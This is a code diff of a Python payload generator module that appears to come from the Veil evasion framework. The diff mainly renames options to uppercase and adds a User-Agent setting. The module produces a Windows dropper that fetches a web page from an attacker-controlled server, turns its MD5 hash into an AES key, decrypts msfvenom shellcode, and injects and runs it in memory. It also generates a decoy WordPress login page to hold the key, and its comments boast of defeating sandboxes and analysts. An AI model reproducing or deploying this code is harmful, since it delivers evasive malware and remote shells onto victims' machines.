@@ -2,37 +2,36 @@
 """
 
 This payload has AES encrypted shellcode stored on a webserver.  At runtime, the executable
-uses the key from a HTML requet holding the key, using md5 to hash the html output and produce 
+uses the key from a HTML requet holding the key, using md5 to hash the html output and produce
 required 16 Byte key. Than injects it into memory, and executes it.
 
 [*] Logic:
 - HTTP Request on your hosted webpage:                                     <-----
-    DOWN ----> Sleep and try to reach supplied webpage using HTTP response code 
+    DOWN ----> Sleep and try to reach supplied webpage using HTTP response code
     UP ----> Preform MD5 hash of HTML of webpage:
         MD5 ---> pass to decryption function:
-            CalL Shellcode ----> Shellcode invojes callback: WIN 
+            CalL Shellcode ----> Shellcode invojes callback: WIN
 
 
 [*] Benefits:
-- Uses urllib2 to make get request against supplied server and returns the 
+- Uses urllib2 to make get request against supplied server and returns the
   HTML text for md5 hashing.
 - Prevents Key being deployed with payload, preventing payload to run in sandbox
   if target server is taken offline during initial deployment.
 - Once use of payload is over, take down webserver to prevent future infections
-- Static and future dynamic RE is near impossible without proper data collection. 
-- Proper web log monitoring will identify when webserver is burnt and crucial to 
-  remove key to prevent future ability to RE binary. Defenders would need to capture 
+- Static and future dynamic RE is near impossible without proper data collection.
+- Proper web log monitoring will identify when webserver is burnt and crucial to
+  remove key to prevent future ability to RE binary. Defenders would need to capture
   live memory to capture key.
 - Devloped custom HTML login page to be hosted as key for payload
 
 
 
 ---------------------------------------
-Based off AES encrypt module by @christruncer 
+Based off AES encrypt module by @christruncer
 
 module by @KillSwitch-GUI: Alex Rymdeko-Harvey
-
-
+ 
 """
 
 from modules.common import shellcode
@@ -41,36 +40,40 @@ from modules.common import encryption
 
 
 class Payload:
-    
+
     def __init__(self):
         # required options
-        self.description = """AES Encrypted shellcode is decrypted upon HTTP request, injected into memory, and executed. 
+        self.description = """AES Encrypted shellcode is decrypted upon HTTP request, injected into memory, and executed.
         [*] Usage: Deploy webserver with cloned website, activate html page hosting key at specified URL. After building payload
         with Veil bring down hosted page. after delivery of binary stand up stagging server and watch the shells come."""
         self.language = "python"
         self.extension = "py"
         self.rating = "Excellent"
-        
+
         self.shellcode = shellcode.Shellcode()
-        
-        # options we require user interaction for- format is {Option : [Value, Description]]}
-        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
-                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
-                                 "inject_method" : ["Virtual", "Virtual, Void, Heap"],
-                                 "sleep_time" : ["60", "Set the sleep time between HTTP Key request"],
-                                 "target_server" : ["http://www.site.com/wordpress.html", "Set target URI path of the decryption key"],
-                                 "html_file_path" : ["/root/Desktop/", "Set the output of HTML file name"]}
 
-        
-        
+        # options we require user interaction for- format is {OPTION : [Value, Description]]}
+        self.required_options = {
+                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
+                                    "USE_PYHERION"   : ["N", "Use the pyherion encrypter"],
+                                    "INJECT_METHOD"  : ["Virtual", "Virtual, Void, Heap"],
+                                    "SLEEP_TIME"     : ["60", "Set the sleep time between HTTP Key request"],
+                                    "TARGET_SERVER"  : ["http://www.site.com/wordpress.html", "Set target URI path of the decryption key"],
+                                    "HTML_FILE_PATH" : ["/root/Desktop/", "Set the output of HTML file name"],
+				    "USER_AGENT"     : ["Mozilla/4.0", "Set your custom useragent"]
+				 }
+
+
+
     def generate(self):
-        if self.required_options["inject_method"][0].lower() == "virtual":
-                target_server = str(self.required_options["target_server"][0])
-                target_html_file = str(target_server.split('/')[-1]) 
+        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
+                TARGET_SERVER = str(self.required_options["TARGET_SERVER"][0])
+                target_html_file = str(TARGET_SERVER.split('/')[-1])
+		USER_AGENT = "'User-agent', '" + self.required_options['USER_AGENT'][0]
 
-                
+
                 # Generate Shellcode Using msfvenom
-                Shellcode = self.shellcode.generate()
+                Shellcode = self.shellcode.generate(self.required_options)
 
                 # Generate Random Variable Names
                 ShellcodeVariableName = helpers.randomString()
@@ -94,17 +97,17 @@ class Payload:
                 RandHttpstring = helpers.randomString()
 
                 # Genrate Random HTML code for webserver to host key file
-               
-                f = open(str(self.required_options["html_file_path"][0]) + target_html_file,'w')
-                html_data = """ 
+
+                f = open(str(self.required_options["HTML_FILE_PATH"][0]) + target_html_file,'w')
+                html_data = """
                 <!DOCTYPE html>
                 <!--[if IE 8]>
                         <html xmlns="http://www.w3.org/1999/xhtml" class="ie8" lang="en-US">
                     <![endif]-->
                 <!--[if !(IE 8) ]><!-->
                 <html xmlns="http://www.w3.org/1999/xhtml" lang="en-US"><!--<![endif]--><head>
-            
-    
+
+
                 <form name="loginform" id="loginform" action="http://mainpage/wp-login.php" method="post">
                     <p>
                         <label for="user_login">Username<br>
@@ -128,12 +131,12 @@ class Payload:
 
 
                     <p id="backtoblog"><a href="http://" title="Are you lost?">← Back to main page</a></p>
-    
+
                     </div>
-                   
+
                         <div class="clear"></div>
-    
-    
+
+
                     </body></html>
                 """
                 html_data += '<!--'+ RandHttpstring +'-->'
@@ -143,7 +146,7 @@ class Payload:
 
                 # encrypt the shellcode and grab the HTTP-Md5-Hex Key from new function
                 (EncodedShellcode, secret) = encryption.encryptAES_http_request(Shellcode, html_data)
-        
+
                 # Create Payload code
                 PayloadCode =  'import ctypes\n'
                 PayloadCode += 'from Crypto.Cipher import AES\n'
@@ -151,17 +154,19 @@ class Payload:
                 PayloadCode += 'import os\n'
                 PayloadCode += 'import time\n'
                 PayloadCode += 'import md5\n'
-                PayloadCode += 'from urllib2 import Request, urlopen, URLError\n'
+                PayloadCode += 'import urllib2\n'
+                PayloadCode += 'opener = urllib2.build_opener()\n'
+                PayloadCode += 'opener.addheaders' + ' = ' '[('+ USER_AGENT +'\')]' '\n'
                 # Define Target Server "Key hosting server"
-                PayloadCode += RandKeyServer + ' = ' '"'+ target_server +'"' '\n'
+                PayloadCode += RandKeyServer + ' = ' '"'+ TARGET_SERVER +'"' '\n'
                 PayloadCode += 'while True:\n'
                 PayloadCode += ' try:\n'
                 # Open Target Server with HTTP GET request
-                PayloadCode += '  ' + RandResponse + '= urlopen('+ RandKeyServer +') \n' 
+                PayloadCode += '  ' + RandResponse + '= opener.open('+ RandKeyServer +') \n'
                 # Check to see if server returns a 200 code or if not its most likely a 400 code
                 PayloadCode += '  if ' + RandResponse + '.code == 200:\n'
                 # Opening and requesting HTML from Target Server
-                PayloadCode += '   '+ RandHttpKey + ' = urlopen('+ RandKeyServer +').read()\n'
+                PayloadCode += '   '+ RandHttpKey + ' = opener.open('+ RandKeyServer +').read()\n'
                 PayloadCode += '   '+ RandMD5 +' = md5.new()\n'
                 PayloadCode += '   '+ RandHttpKey + ' = str(' + RandHttpKey + ')\n'
                 # Genrate MD5 hash of HTML on page
@@ -174,7 +179,7 @@ class Payload:
                 PayloadCode += '   break\n'
                 # At any point it fails you will be in sleep for supplied time
                 PayloadCode += ' except URLError, e:\n'
-                PayloadCode += '  time.sleep('+ self.required_options["sleep_time"][0] +')\n'
+                PayloadCode += '  time.sleep('+ self.required_options["SLEEP_TIME"][0] +')\n'
                 PayloadCode += '  pass\n'
                 # Execute Shellcode inject
                 PayloadCode += RandPadding + ' = \'{\'\n'
@@ -187,19 +192,20 @@ class Payload:
                 PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + RandShellCode + ')))\n'
                 PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                 PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
-        
-                if self.required_options["use_pyherion"][0].lower() == "y":
+
+                if self.required_options["USE_PYHERION"][0].lower() == "y":
                     PayloadCode = encryption.pyherion(PayloadCode)
 
                 return PayloadCode
 
-        elif self.required_options["inject_method"][0].lower() == "heap":
-                target_server = str(self.required_options["target_server"][0])
-                target_html_file = str(target_server.split('/')[-1])  
-            
+        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
+                TARGET_SERVER = str(self.required_options["TARGET_SERVER"][0])
+                target_html_file = str(TARGET_SERVER.split('/')[-1])
+		USER_AGENT = "User-Agent: " + self.required_options['USER_AGENT'][0]
+
                 # Generate Shellcode Using msfvenom
-                Shellcode = self.shellcode.generate()
-        
+                Shellcode = self.shellcode.generate(self.required_options)
+
                 # Generate Random Variable Names
                 ShellcodeVariableName = helpers.randomString()
                 RandPtr = helpers.randomString()
@@ -213,7 +219,7 @@ class Payload:
                 RandToday = helpers.randomString()
                 RandExpire = helpers.randomString()
                 HeapVar = helpers.randomString()
-    
+
                 # Define Random Variable Names for HTTP functions
                 RandResponse = helpers.randomString()
                 RandHttpKey = helpers.randomString()
@@ -225,17 +231,17 @@ class Payload:
                 RandHttpstring = helpers.randomString()
 
                 # Genrate Random HTML code for webserver to host key file
-               
-                f = open(str(self.required_options["html_file_path"][0]) + target_html_file,'w')
-                html_data = """ 
+
+                f = open(str(self.required_options["HTML_FILE_PATH"][0]) + target_html_file,'w')
+                html_data = """
                 <!DOCTYPE html>
                 <!--[if IE 8]>
                         <html xmlns="http://www.w3.org/1999/xhtml" class="ie8" lang="en-US">
                     <![endif]-->
                 <!--[if !(IE 8) ]><!-->
                 <html xmlns="http://www.w3.org/1999/xhtml" lang="en-US"><!--<![endif]--><head>
-            
-    
+
+
                 <form name="loginform" id="loginform" action="http://mainpage/wp-login.php" method="post">
                     <p>
                         <label for="user_login">Username<br>
@@ -259,12 +265,12 @@ class Payload:
 
 
                     <p id="backtoblog"><a href="http://" title="Are you lost?">← Back to main page</a></p>
-    
+
                     </div>
-                   
+
                         <div class="clear"></div>
-    
-    
+
+
                     </body></html>
                 """
                 html_data += '<!--'+ RandHttpstring +'-->'
@@ -274,7 +280,7 @@ class Payload:
 
                 # encrypt the shellcode and grab the randomized key
                 (EncodedShellcode, secret) = encryption.encryptAES_http_request(Shellcode, html_data)
-        
+
                 # Create Payload code
                 PayloadCode =  'import ctypes\n'
                 PayloadCode += 'from Crypto.Cipher import AES\n'
@@ -282,17 +288,19 @@ class Payload:
                 PayloadCode += 'import os\n'
                 PayloadCode += 'import time\n'
                 PayloadCode += 'import md5\n'
-                PayloadCode += 'from urllib2 import Request, urlopen, URLError\n'
+                PayloadCode += 'import urllib2\n'
+                PayloadCode += 'opener = urllib2.build_opener()\n'
+                PayloadCode += 'opener.addheaders' + ' = ' '"'+ USER_AGENT +'"' '\n'                
                 # Define Target Server "Key hosting server"
-                PayloadCode += RandKeyServer + ' = ' '"'+ target_server +'"' '\n'
+                PayloadCode += RandKeyServer + ' = ' '"'+ TARGET_SERVER +'"' '\n'
                 PayloadCode += 'while True:\n'
                 PayloadCode += ' try:\n'
                 # Open Target Server with HTTP GET request
-                PayloadCode += '  ' + RandResponse + '= urlopen('+ RandKeyServer +') \n' 
+                PayloadCode += '  ' + RandResponse + '= opener.open('+ RandKeyServer +') \n'
                 # Check to see if server returns a 200 code or if not its most likely a 400 code
                 PayloadCode += '  if ' + RandResponse + '.code == 200:\n'
                 # Opening and requesting HTML from Target Server
-                PayloadCode += '   '+ RandHttpKey + ' = urlopen('+ RandKeyServer +').read()\n'
+                PayloadCode += '   '+ RandHttpKey + ' = opener.open('+ RandKeyServer +').read()\n'
                 PayloadCode += '   '+ RandMD5 +' = md5.new()\n'
                 PayloadCode += '   '+ RandHttpKey + ' = str(' + RandHttpKey + ')\n'
                 # Genrate MD5 hash of HTML on page
@@ -305,7 +313,7 @@ class Payload:
                 PayloadCode += '   break\n'
                 # At any point it fails you will be in sleep for supplied time
                 PayloadCode += ' except URLError, e:\n'
-                PayloadCode += '  time.sleep('+ self.required_options["sleep_time"][0] +')\n'
+                PayloadCode += '  time.sleep('+ self.required_options["SLEEP_TIME"][0] +')\n'
                 PayloadCode += '  pass\n'
                 # Execute Shellcode inject
                 PayloadCode += RandPadding + ' = \'{\'\n'
@@ -319,19 +327,20 @@ class Payload:
                 PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
                 PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                 PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
-        
-                if self.required_options["use_pyherion"][0].lower() == "y":
+
+                if self.required_options["USE_PYHERION"][0].lower() == "y":
                     PayloadCode = encryption.pyherion(PayloadCode)
 
                 return PayloadCode
 
         else:
-            if self.required_options["expire_payload"][0].lower() == "x":
-                target_server = str(self.required_options["target_server"][0])
-                target_html_file = str(target_server.split('/')[-1]) 
+            if self.required_options["EXPIRE_PAYLOAD"][0].lower() == "x":
+                TARGET_SERVER = str(self.required_options["TARGET_SERVER"][0])
+                target_html_file = str(TARGET_SERVER.split('/')[-1])
+                USER_AGENT = "User-Agent: " + self.required_options['USER_AGENT'][0]
                 # Generate Shellcode Using msfvenom
-                Shellcode = self.shellcode.generate()
-        
+                Shellcode = self.shellcode.generate(self.required_options)
+
                 # Generate Random Variable Names
                 ShellcodeVariableName = helpers.randomString()
                 RandPtr = helpers.randomString()
@@ -345,7 +354,7 @@ class Payload:
                 RandShellcode = helpers.randomString()
                 RandReverseShell = helpers.randomString()
                 RandMemoryShell = helpers.randomString()
-    
+
                 # Define Random Variable Names for HTTP functions
                 RandResponse = helpers.randomString()
                 RandHttpKey = helpers.randomString()
@@ -357,17 +366,17 @@ class Payload:
                 RandHttpstring = helpers.randomString()
 
                 # Genrate Random HTML code for webserver to host key file
-               
-                f = open(str(self.required_options["html_file_path"][0]) + target_html_file,'w')
-                html_data = """ 
+
+                f = open(str(self.required_options["HTML_FILE_PATH"][0]) + target_html_file,'w')
+                html_data = """
                 <!DOCTYPE html>
                 <!--[if IE 8]>
                         <html xmlns="http://www.w3.org/1999/xhtml" class="ie8" lang="en-US">
                     <![endif]-->
                 <!--[if !(IE 8) ]><!-->
                 <html xmlns="http://www.w3.org/1999/xhtml" lang="en-US"><!--<![endif]--><head>
-            
-    
+
+
                 <form name="loginform" id="loginform" action="http://mainpage/wp-login.php" method="post">
                     <p>
                         <label for="user_login">Username<br>
@@ -391,12 +400,12 @@ class Payload:
 
 
                     <p id="backtoblog"><a href="http://" title="Are you lost?">← Back to main page</a></p>
-    
+
                     </div>
-                   
+
                         <div class="clear"></div>
-    
-    
+
+
                     </body></html>
                 """
                 html_data += '<!--'+ RandHttpstring +'-->'
@@ -406,7 +415,7 @@ class Payload:
 
                 # encrypt the shellcode and grab the randomized key
                 (EncodedShellcode, secret) = encryption.encryptAES_http_request(Shellcode, html_data)
-        
+
                 # Create Payload code
                 PayloadCode = 'from ctypes import *\n'
                 PayloadCode += 'from Crypto.Cipher import AES\n'
@@ -414,19 +423,21 @@ class Payload:
                 PayloadCode += 'import os\n'
                 PayloadCode += 'import time\n'
                 PayloadCode += 'import md5\n'
-                PayloadCode += 'from urllib2 import Request, urlopen, URLError\n'
+                PayloadCode += 'import urllib2\n'
+                PayloadCode += 'opener = urllib2.build_opener()\n'
+                PayloadCode += 'opener.addheaders' + ' = ' '"'+ USER_AGENT +'"' '\n'            
                 PayloadCode += 'from datetime import datetime\n'
                 PayloadCode += 'from datetime import date\n\n'
                 # Define Target Server "Key hosting server"
-                PayloadCode += RandKeyServer + ' = ' '"'+ target_server +'"' '\n'
+                PayloadCode += RandKeyServer + ' = ' '"'+ TARGET_SERVER +'"' '\n'
                 PayloadCode += 'while True:\n'
                 PayloadCode += ' try:\n'
                 # Open Target Server with HTTP GET request
-                PayloadCode += '  ' + RandResponse + '= urlopen('+ RandKeyServer +') \n' 
+                PayloadCode += '  ' + RandResponse + '= opener.open('+ RandKeyServer +') \n'
                 # Check to see if server returns a 200 code or if not its most likely a 400 code
                 PayloadCode += '  if ' + RandResponse + '.code == 200:\n'
                 # Opening and requesting HTML from Target Server
-                PayloadCode += '   '+ RandHttpKey + ' = urlopen('+ RandKeyServer +').read()\n'
+                PayloadCode += '   '+ RandHttpKey + ' = opener.open('+ RandKeyServer +').read()\n'
                 PayloadCode += '   '+ RandMD5 +' = md5.new()\n'
                 PayloadCode += '   '+ RandHttpKey + ' = str(' + RandHttpKey + ')\n'
                 # Genrate MD5 hash of HTML on page
@@ -439,7 +450,7 @@ class Payload:
                 PayloadCode += '   break\n'
                 # At any point it fails you will be in sleep for supplied time
                 PayloadCode += ' except URLError, e:\n'
-                PayloadCode += '  time.sleep('+ self.required_options["sleep_time"][0] +')\n'
+                PayloadCode += '  time.sleep('+ self.required_options["SLEEP_TIME"][0] +')\n'
                 PayloadCode += '  pass\n'
                 PayloadCode += RandPadding + ' = \'{\'\n'
                 PayloadCode += RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n'
@@ -449,8 +460,8 @@ class Payload:
                 PayloadCode += RandMemoryShell + ' = create_string_buffer(' + ShellcodeVariableName + ', len(' + ShellcodeVariableName + '))\n'
                 PayloadCode += RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
                 PayloadCode += RandShellcode + '()'
-    
-                if self.required_options["use_pyherion"][0].lower() == "y":
+
+                if self.required_options["USE_PYHERION"][0].lower() == "y":
                     PayloadCode = encryption.pyherion(PayloadCode)
 
                 return PayloadCode
